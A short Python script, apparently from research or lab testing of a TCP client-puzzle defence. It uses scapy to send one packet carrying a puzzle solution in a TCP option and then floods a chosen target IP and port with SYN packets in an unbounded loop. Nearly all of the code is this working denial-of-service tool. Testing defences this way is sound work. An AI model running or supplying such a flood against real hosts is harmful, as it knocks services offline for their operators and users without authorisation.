from __future__ import absolute_import
from __future__ import division
from __future__ import print_function

import os
import argparse

from scapy.all import *

from CP_agent import CP_agent


def main(args):

    host_idx = args.ip.split('.')[-1].rjust(3, '0')
    puzzle_dir = 'client_puzzle/'
    puzzle_agent = CP_agent(args.ip, host_idx, puzzle_dir, True)

    solved_puzzle = puzzle_agent.get_puzzle('{}:{}'.format(args.target_ip, args.target_port))
    packet = IP(
        dst = args.target_ip, 
        src = args.ip
    ) / TCP(
        sport = 6666, 
        dport = args.target_port, 
        seq = 1, 
        options = [(254, solved_puzzle)]
    )
    send(packet)

    time.sleep(1)

    SYN = IP(
        dst = args.target_ip, 
        src = args.ip
    ) / TCP(
        sport = 6666, 
        dport = args.target_port, 
        seq = 1, 
        flags = 'S'
    )
	
    while True:
        send(SYN, verbose=0)



def _parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('--ip', type=str, required=True, dest='ip', help='source ip')
    parser.add_argument('--target-ip', type=str, required=True, dest='target_ip', help='target ip')
    parser.add_argument('--target-port', type=int, default=6666, dest='target_port', help='target port')
    return parser.parse_args()


if __name__ == '__main__':
    args = _parse_args()
    try:
        main(args)
    except KeyboardInterrupt:
        pass